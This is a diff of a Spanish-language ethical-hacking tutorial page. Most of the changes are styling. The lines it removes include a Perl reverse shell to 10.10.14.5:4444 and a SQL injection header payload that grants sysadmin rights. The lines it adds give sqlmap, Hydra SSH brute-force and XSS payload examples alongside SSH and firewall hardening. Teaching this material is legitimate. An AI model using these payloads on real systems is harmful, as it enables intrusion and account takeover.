@@ -13,9 +13,9 @@
     <style>
         /* Variables y Configuración General */
         :root {
-            --bg-color: #000000; /* Fondo más oscuro */
-            --main-color: #00ff00;
-            --highlight-color: #00ffff;
+            --bg-color: #000000; 
+            --main-color: #00ff00; /* Verde neón */
+            --highlight-color: #00ffff; /* Cian */
             --shadow-color: rgba(0, 255, 0, 0.7);
             --error-color: #ff0000;
             --font-family: 'Consolas', 'Courier New', Courier, monospace;
@@ -26,7 +26,7 @@
             color: var(--main-color);
             font-family: var(--font-family);
             margin: 0;
-            padding-top: 50px; /* Espacio para la barra de navegación fija */
+            padding-top: 50px; 
             overflow-x: hidden;
             text-shadow: 0 0 1px var(--main-color);
             line-height: 1.5;
@@ -38,11 +38,15 @@
             0%, 100% { background-color: var(--main-color); box-shadow: 0 0 5px var(--main-color); }
             50% { background-color: transparent; box-shadow: none; }
         }
+        @keyframes scan-line {
+            0% { background-position: 0% 0; }
+            100% { background-position: 0% 100%; }
+        }
 
         /* Canvas (Lluvia Matrix) */
         #matrixCanvas {
             position: fixed; top: 0; left: 0; width: 100vw; height: 100vh;
-            z-index: 0; pointer-events: none; opacity: 0.15; /* Sutil */
+            z-index: 0; pointer-events: none; opacity: 0.15;
         }
 
         /* Contenedor Principal: Centrado y Opaco */
@@ -57,6 +61,7 @@
             border-left: 1px solid var(--main-color);
             border-right: 1px solid var(--main-color);
             min-height: calc(100vh - 60px);
+            box-shadow: 0 0 15px rgba(0, 255, 0, 0.3); /* Sombra exterior sutil */
         }
 
         /* --- Barra de Navegación Fija (Menú) --- */
@@ -68,32 +73,21 @@
             background-color: rgba(0, 0, 0, 0.98);
             border-bottom: 2px solid var(--highlight-color);
             padding: 5px 0;
-            z-index: 100; /* Siempre encima */
+            z-index: 100; 
             text-align: center;
             box-shadow: 0 0 15px var(--highlight-color);
         }
-        nav ul {
-            list-style: none;
-            padding: 0;
-            margin: 0;
-            display: flex;
-            justify-content: center;
-            flex-wrap: wrap; /* Para que funcione bien en móvil */
-        }
-        nav li {
-            margin: 0 10px;
-        }
+        nav ul { list-style: none; padding: 0; margin: 0; display: flex; justify-content: center; flex-wrap: wrap; }
+        nav li { margin: 0 10px; }
         nav a {
-            color: var(--main-color);
-            text-decoration: none;
-            padding: 5px 10px;
-            display: block;
-            transition: all 0.2s;
+            color: var(--main-color); text-decoration: none; padding: 5px 10px; display: block; transition: all 0.2s;
+            border: 1px solid transparent; /* Para el efecto hover */
         }
         nav a:hover {
             color: var(--highlight-color);
             background-color: rgba(0, 255, 255, 0.1);
             text-shadow: 0 0 5px var(--highlight-color);
+            border: 1px solid var(--highlight-color);
         }
 
         /* Cabecera y Logo */
@@ -101,21 +95,29 @@
             text-align: left;
             padding-bottom: 10px;
             margin-bottom: 30px;
+            border-bottom: 1px dashed var(--main-color); /* Separador para la cabecera */
         }
-        #logo-ascii {
-            font-size: 0.85em;
+        #logo-display {
+            font-size: 0.8em;
             line-height: 1.1;
             white-space: pre;
             color: #4CAF50;
-            padding: 5px;
+            padding: 10px;
             border: 1px dashed #004d00;
             display: inline-block;
             box-shadow: 0 0 8px rgba(76, 175, 80, 0.5);
             margin-bottom: 15px;
+            margin-top: 10px;
+            background-color: rgba(0, 10, 0, 0.3); /* Fondo para el logo */
+        }
+        #logo-display .status-line {
+            color: var(--highlight-color);
+            margin-top: 5px;
         }
         .status-led {
             height: 10px; width: 10px; background-color: var(--main-color); border-radius: 50%;
             display: inline-block; margin-right: 5px; animation: led-flash 1s infinite;
+            vertical-align: middle; /* Alinea el LED */
         }
 
         /* Título Principal y Prompt */
@@ -148,13 +150,14 @@
             margin-bottom: 30px;
             transition: all 0.2s ease-in-out;
             border-top: 1px solid rgba(0, 255, 255, 0.2);
+            box-shadow: inset 0 0 5px rgba(0, 255, 255, 0.1);
         }
         article:hover { border-left-color: #ffff00; box-shadow: inset 0 0 10px rgba(255, 255, 0, 0.2); }
         article h3 { color: #ffff00; text-shadow: 0 0 3px #ffff00; }
         
         /* Bloque de Código (Estilo Terminal / CD de Linux) */
         pre {
-            background-color: #1a1a1a; /* Fondo más oscuro que el artículo */
+            background-color: #1a1a1a; 
             color: #f0f0f0;
             border: 1px solid var(--main-color);
             padding: 15px;
@@ -164,28 +167,21 @@
             margin-top: 15px;
             position: relative;
         }
-        
-        /* Simulación de barra de título del terminal */
         pre::before {
             content: " [ kali@shell:~ ] ";
             position: absolute;
             top: -1px;
             left: 0;
-            background-color: #008000; /* Verde más oscuro */
+            background-color: #006400; /* Verde oscuro para la barra de título */
             color: white;
             font-weight: bold;
             padding: 2px 10px;
             font-size: 0.8em;
             border-right: 1px solid var(--main-color);
         }
-        
-        /* Añadir espacio para que el código no se superponga con el título simulado */
-        pre code {
-            display: block;
-            padding-top: 15px; 
-        }
+        pre code { display: block; padding-top: 15px; }
 
-        /* Imágenes (Para facilitar la subida de fotos, simplemente arrastra al repo y usa el nombre) */
+        /* Imágenes */
         img {
             max-width: 100%;
             height: auto;
@@ -195,6 +191,47 @@
             margin-left: auto;
             margin-right: auto;
             box-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+        }
+
+        /* Sección Especial: Creaciones y Favoritos */
+        #creador-section {
+            background-color: #0a0a0a;
+            border: 3px double var(--error-color); /* Doble borde rojo */
+            box-shadow: 0 0 25px var(--error-color); /* Sombra roja intensa */
+            padding: 25px;
+            margin-top: 60px;
+            margin-bottom: 60px;
+            text-align: center;
+            position: relative;
+            overflow: hidden; /* Para el efecto de scanline */
+        }
+        #creador-section::before { /* Efecto de escaneo tipo TV antigua */
+            content: '';
+            position: absolute;
+            top: 0; left: 0; right: 0; bottom: 0;
+            background: linear-gradient(to bottom, transparent 50%, rgba(0,0,0,0.5) 50%), linear-gradient(to right, transparent 50%, rgba(0,0,0,0.5) 50%);
+            background-size: 100% 2px, 2px 100%;
+            animation: scan-line 5s linear infinite; /* Animación de scanline */
+            pointer-events: none;
+            opacity: 0.3;
+        }
+        #creador-section h2 {
+            color: var(--error-color);
+            border-bottom: 2px solid var(--error-color);
+            padding-bottom: 10px;
+            text-shadow: 0 0 8px var(--error-color);
+            font-size: 1.8em;
+            margin-top: 0;
+        }
+        #creador-section .empty-slot {
+            background-color: rgba(255, 0, 0, 0.1);
+            border: 1px dashed var(--error-color);
+            padding: 20px;
+            margin: 20px auto;
+            max-width: 600px;
+            color: #ffaaaa;
+            font-style: italic;
+            box-shadow: 0 0 10px rgba(255, 0, 0, 0.3);
         }
 
         /* Pie de página (Protocolo) */
@@ -210,11 +247,12 @@
         
         /* Ajustes para Móviles (Responsive) */
         @media (max-width: 600px) {
-            body { padding-top: 80px; } /* Más espacio para la nav bar en 2 líneas */
+            body { padding-top: 80px; } 
             nav ul { flex-direction: column; }
             nav li { margin: 5px 0; }
             #main-title { font-size: 1.5em; }
-            #logo-ascii { font-size: 0.7em; }
+            #logo-display { font-size: 0.6em; padding: 5px; }
+            pre::before { font-size: 0.7em; padding: 1px 5px; }
         }
 
     </style>
@@ -228,13 +266,14 @@
             <li><a href="#recursos">[ 0x01 ] Recursos</a></li>
             <li><a href="#defensivo">[ 0x02 ] Defensivo</a></li>
             <li><a href="#historico">[ 0x03 ] Archivo</a></li>
-            <li><a href="#protocolo">[ 0x04 ] Protocolo</a></li>
+            <li><a href="#creador">[ 0x04 ] Creaciones</a></li>
+            <li><a href="#protocolo">[ 0x05 ] Protocolo</a></li>
         </ul>
     </nav>
 
     <div class="container">
         <header>
-            <div id="logo-ascii">
+            <div id="logo-display">
                 [ Iniciando Codificación ]
                 <pre>
                     .'.. /|
@@ -246,134 +285,150 @@
                   | | |
                   \_/
                 </pre>
-                [ <span class="status-led"></span> Status: Online ]
-                <br>[ Imdustrias Lazarus ] | [ KaliHunter32 ]
+                <div class="status-line">
+                    [ <span class="status-led"></span> Status: Online ]
+                </div>
+                [ Imdustrias Lazarus ] | [ KaliHunter32 ]
             </div>
             
             <h1 id="main-title" class="prompt"></h1> 
         </header>
 
         <section id="recursos">
-            <h2>// 0x01 RECURSOS EN LÍNEA: Herramientas y OSINT //</h2>
+            <h2>// 0x01 RECURSOS EN LÍNEA: Herramientas Kali Linux //</h2>
             
             <article>
-                <h3>[ OSINT ] Detección de Tecnologías con Wappalyzer</h3>
-                <p>La inteligencia de fuentes abiertas (OSINT) es crucial. Antes de interactuar, necesitamos saber qué tecnologías usa el objetivo. Wappalyzer es una extensión de navegador (o herramienta CLI) que identifica frameworks, CMS, servidores, y más.</p>
+                <h3>[ RECONOCIMIENTO ] Nmap: Escaneo Completo de Servicios y OS</h3>
+                <p>Nmap es el estándar para el descubrimiento de redes y auditorías de seguridad. El comando `-A` habilita la detección del sistema operativo y las versiones de los servicios, `-T4` acelera el escaneo. Siempre con permiso.</p>
                 <pre><code>
-# Comando CLI de Wappalyzer (requiere instalación)
-wappalyzer https://dominioobjetivo.com
+# Escaneo agresivo (OS y Versión) de un rango de IPs
+nmap -A -T4 192.168.1.0/24
                 </code></pre>
-                <img src="Imagen_Wappalyzer.png" alt="Captura de pantalla de la detección de tecnologías." style="max-width: 50%;">
-                <p> **[ FÁCIL DE EDITAR ]** Para cambiar la imagen, simplemente sube "Imagen_Wappalyzer.png" a tu repositorio y reemplaza el texto ALT.</p>
+                <img src="https://via.placeholder.com/600x300/004d00/00ffff?text=Nmap+Scan+Ejemplo" alt="Captura de pantalla de un escaneo Nmap.">
+                <p>Este escaneo puede generar mucho tráfico de red, úsalo con precaución y solo en entornos autorizados.</p>
             </article>
 
             <article>
-                <h3>[ ESCANEO ] Nmap: Escaneo de Versiones y OS</h3>
-                <p>Nmap es el estándar de la industria. Para obtener la información más detallada sobre los puertos abiertos, incluyendo el sistema operativo y las versiones exactas de los servicios, se utiliza la opción `-A` (agresivo).</p>
+                <h3>[ OSINT ] theHarvester: Recolección de Correos y Subdominios</h3>
+                <p>theHarvester es una herramienta de OSINT que busca direcciones de correo electrónico, subdominios, nombres de host, y más de fuentes públicas como Google, Bing, LinkedIn y Shodan. Es un excelente punto de partida para la fase de reconocimiento.</p>
                 <pre><code>
-# Escaneo agresivo y rápido (T4)
-nmap -A -T4 192.168.1.1/24
+# Buscar correos y subdominios para 'ejemplo.com' desde Google y Baidu
+theharvester -d ejemplo.com -l 500 -b google,baidu
                 </code></pre>
+                <p>La opción `-l` limita el número de resultados y `-b` especifica las fuentes. Siempre respeta las políticas de uso de cada motor de búsqueda.</p>
             </article>
 
+            <article>
+                <h3>[ ANÁLISIS WEB ] Nikto: Escáner de Vulnerabilidades Web</h3>
+                <p>Nikto es un escáner de vulnerabilidades de servidores web de código abierto. Realiza pruebas completas contra servidores web para múltiples elementos, incluyendo más de 6700 archivos/programas potencialmente peligrosos, verificaciones de versiones obsoletas, y problemas específicos de servidores.</p>
+                <pre><code>
+# Escaneo básico contra un objetivo web
+nikto -h http://target.com
+                </code></pre>
+                <p>Nikto es bastante ruidoso y puede ser detectado fácilmente por un WAF (Web Application Firewall). Es más adecuado para las primeras etapas de un pentest interno.</p>
+            </article>
+            
         </section>
         
         <section id="defensivo">
-            <h2>// 0x02 SEGURIDAD DEFENSIVA: Mitigación y Hardening //</h2>
+            <h2>// 0x02 SEGURIDAD DEFENSIVA: Hardening y Prevención //</h2>
             
             <article>
-                <h3>[ HARDENING ] Deshabilitar servicios innecesarios en Linux</h3>
-                <p>La superficie de ataque se reduce deshabilitando los servicios que no se usan. Menos servicios = menos posibles puntos de entrada. Ejemplo con `systemctl` en sistemas basados en Systemd.</p>
+                <h3>[ HARDENING ] Deshabilitar SSH Root Login y Auth por Contraseña</h3>
+                <p>Para securizar un servidor SSH, es fundamental deshabilitar el acceso directo como `root` y la autenticación por contraseña, forzando el uso de claves SSH. Edita el archivo `/etc/ssh/sshd_config`.</p>
                 <pre><code>
-# Ver todos los servicios activos
-systemctl list-units --type=service --state=running
-
-# Deshabilitar un servicio (ej. Apache si no se usa)
-sudo systemctl stop apache2
-sudo systemctl disable apache2
+# Archivo: /etc/ssh/sshd_config
+PermitRootLogin no
+PasswordAuthentication no
                 </code></pre>
+                <p>Después de editar, reinicia el servicio SSH: `sudo systemctl restart sshd`. Asegúrate de tener una clave SSH configurada y funcionando antes de deshabilitar la autenticación por contraseña.</p>
             </article>
 
             <article>
-                <h3>[ MITIGACIÓN ] Prevención de CSRF (Token Syncronizer)</h3>
-                <p>Cross-Site Request Forgery (CSRF) se mitiga con tokens de sincronización únicos por sesión. El servidor genera un token y lo verifica en cada solicitud POST importante.</p>
+                <h3>[ FIREWALL ] Reglas Básicas con UFW (Uncomplicated Firewall)</h3>
+                <p>UFW es una interfaz para `iptables` que simplifica la configuración del firewall en Linux. Aquí, reglas para permitir SSH (puerto 22) y denegar todo lo demás por defecto.</p>
                 <pre><code>
-// Ejemplo conceptual en PHP (verificación)
-if ($_POST['csrf_token'] !== $_SESSION['csrf_token']) {
-    die("Error: Token CSRF inválido.");
-}
-// Continuar con la acción...
+# Denegar todas las conexiones entrantes por defecto
+sudo ufw default deny incoming
+# Permitir todas las conexiones salientes por defecto
+sudo ufw default allow outgoing
+
+# Permitir SSH (puerto 22)
+sudo ufw allow ssh
+
+# Habilitar el firewall
+sudo ufw enable
                 </code></pre>
+                <p>Siempre verifica el estado con `sudo ufw status` y ten precaución al configurar firewalls, podrías bloquear tu propio acceso.</p>
             </article>
             
-            <article>
-                <h3>[ CLOUD ] IAM Policy Mínimo para S3 (Principio de Menor Privilegio)</h3>
-                <p>En seguridad Cloud, el Principio de Menor Privilegio (PoLP) es vital. Este ejemplo de política IAM solo permite la acción de lectura (`s3:GetObject`) en una carpeta específica, nada más.</p>
-                <pre><code>
-{
-    "Effect": "Allow",
-    "Action": ["s3:GetObject"],
-    "Resource": ["arn:aws:s3:::mi-bucket-seguro/public/*"]
-}
-                </code></pre>
-            </article>
-
         </section>
 
         <section id="historico">
-            <h2>// 0x03 ARCHIVO HISTÓRICO: Explotación y Conceptos Base //</h2>
+            <h2>// 0x03 ARCHIVO HISTÓRICO: Explotación y Conocimiento //</h2>
             
             <article>
-                <h3>[ SHELL ] Reverse Shell de Perl (Alternativa a Bash)</h3>
-                <p>Si Bash no está disponible o tiene restricciones, Perl es una alternativa común para obtener una shell inversa en sistemas Linux/Unix. Este payload es útil cuando otros fallan.</p>
+                <h3>[ SQLI ] SQLMap: Inyección SQL Automatizada</h3>
+                <p>SQLMap es una herramienta de código abierto que automatiza el proceso de detección y explotación de vulnerabilidades de inyección SQL. Soporta una amplia gama de sistemas de bases de datos y técnicas de inyección.</p>
                 <pre><code>
-perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh");};'
+# Escaneo básico de un parámetro vulnerable
+sqlmap -u "http://target.com/vuln_page.php?id=1" --dbs
                 </code></pre>
+                <p>Este comando intenta listar las bases de datos disponibles si el parámetro `id` es vulnerable. **¡Extremadamente potente, solo usar en entornos autorizados!**</p>
             </article>
 
             <article>
-                <h3>[ WEB ] Búsqueda de Inyecciones de Código en Headers HTTP</h3>
-                <p>No todas las vulnerabilidades están en los parámetros GET/POST. Las aplicaciones a menudo procesan los Headers HTTP (User-Agent, Referer) sin sanitizar. El siguiente ejemplo es un payload para intentar una Inyección SQL ciega.</p>
+                <h3>[ FUERZA BRUTA ] Hydra: Ataques de Contraseñas a Servicios</h3>
+                <p>Hydra es una herramienta de ataque de fuerza bruta rápida y flexible, capaz de atacar más de 50 protocolos incluyendo FTP, SSH, Telnet, HTTP, SMB, y muchos más. Es esencial para pruebas de robustez de contraseñas.</p>
                 <pre><code>
-# Payload en el Header User-Agent
-User-Agent: '; EXEC sp_addsrvrolemember 'usuario', 'sysadmin' --
+# Fuerza bruta a SSH con lista de usuarios y contraseñas
+hydra -L users.txt -P passwords.txt ssh://192.168.1.100
                 </code></pre>
+                <p>Los archivos `users.txt` y `passwords.txt` deben contener listas de credenciales para probar. Utiliza esto solo con consentimiento explícito.</p>
             </article>
 
             <article>
-                <h3>[ LENGUAJE C ] Función Vulnerable a Buffer Overflow (Concepto)</h3>
-                <p>La vulnerabilidad de *buffer overflow* ocurre cuando un programa escribe más datos de lo asignado. Aquí un ejemplo en C del uso inseguro de `gets()`:</p>
+                <h3>[ XSS ] Cross-Site Scripting (Reflejado)</h3>
+                <p>XSS permite a un atacante inyectar scripts maliciosos en páginas web que luego son ejecutados por otros usuarios. Un payload simple para XSS reflejado:</p>
                 <pre><code>
-#include &lt;stdio.h&gt;
-
-void vulnerable_function() {
-    char buffer[10]; 
-    printf("Introduce un string: ");
-    gets(buffer); // FUNCIÓN INSEGURA
-}
+&lt;script&gt;alert('XSS Exitoso por KaliHunter32');&lt;/script&gt;
                 </code></pre>
+                <p>Este payload causa que se muestre una ventana emergente en el navegador del usuario. Un atacante real intentaría robar cookies o redirigir a sitios maliciosos.</p>
             </article>
             
-            <article>
-                <h3>[ CODIFICACIÓN ] Uso de Base64 para ofuscación básica</h3>
-                <p>Base64 es un sistema de codificación, no de cifrado, pero a menudo se utiliza para ofuscar (ocultar a simple vista) strings en payloads o archivos de configuración. Ejemplo en Bash:</p>
+        </section>
+
+        <section id="creador-section">
+            <h2>// 0x04 CREACIONES & FAVORITOS DEL CREADOR //</h2>
+            
+            <div class="empty-slot">
+                <h3>[ Ranura de Creación 0x01 ]</h3>
+                <p>¡Aquí podrás presentar uno de tus propios scripts, herramientas o análisis destacados! Personaliza este espacio con tu código, una descripción y quizás una imagen.</p>
                 <pre><code>
-# Codificar:
-echo "Comando oculto" | base64
-# Salida: Q29tYW5kbyBvY3VsdG8K
-
-# Decodificar:
-echo "Q29tYW5kbyBvY3VsdG8K" | base64 -d
+# Tu código aquí (ej. un script de automatización o un payload defensivo)
+print("Mi Primera Creación")
                 </code></pre>
-            </article>
+                <img src="https://via.placeholder.com/400x200/4d0000/ffaaaa?text=Tu+Proyecto+Aqui" alt="Imagen de tu proyecto o herramienta.">
+            </div>
 
+            <div class="empty-slot">
+                <h3>[ Ranura de Favorito 0x02 ]</h3>
+                <p>Este espacio está reservado para compartir una herramienta de hacking ético que te guste mucho, un recurso que consideres indispensable, o un proyecto de la comunidad que admires.</p>
+                <p>Menciona su nombre, para qué sirve y por qué es tu favorito.</p>
+            </div>
+
+            <div class="empty-slot">
+                <h3>[ Ranura de Creación 0x03 ]</h3>
+                <p>¿Tienes una idea para un nuevo CTF, un nuevo exploit para una máquina virtual, o un write-up de un desafío complejo? Este es el lugar para mostrarlo.</p>
+            </div>
+            
         </section>
 
         <section id="protocolo">
             <footer>
-                <h3>[ PROTOCOLO DE CONCIENCIA CYBERNÉTICA ]</h3>
+                <h3>[ 0x05 PROTOCOLO DE CONCIENCIA CYBERNÉTICA ]</h3>
                 <p><strong>Clasificación: ALTO SECRETO // Solo para Fines Educativos //</strong></p>
-                <p>Este repositorio digital ha sido creado para la **difusión responsable de conocimiento** en el campo de la ciberseguridad, el hacking ético y la investigación de vulnerabilidades. Los materiales aquí expuestos están diseñados para fomentar la comprensión y la protección de sistemas, no para su explotación maliciosa. **LEVIATHAM no se hace responsable.**</p>
+                <p>Este repositorio digital ha sido creado para la **difusión responsable de conocimiento** en el campo de la ciberseguridad, el hacking ético y la investigación de vulnerabilidades. Los materiales aquí expuestos están diseñados para fomentar la comprensión y la protección de sistemas, no para su explotación maliciosa. **LEVIATHAM no se hace responsable por el mal uso de la información.**</p>
                 <p>Se espera que los visitantes actúen con **integridad, ética y respeto** por la ley y la propiedad digital.</p>
                 <p>// El conocimiento es una herramienta: su impacto depende de las manos que lo empuñen //</p>
             </footer>
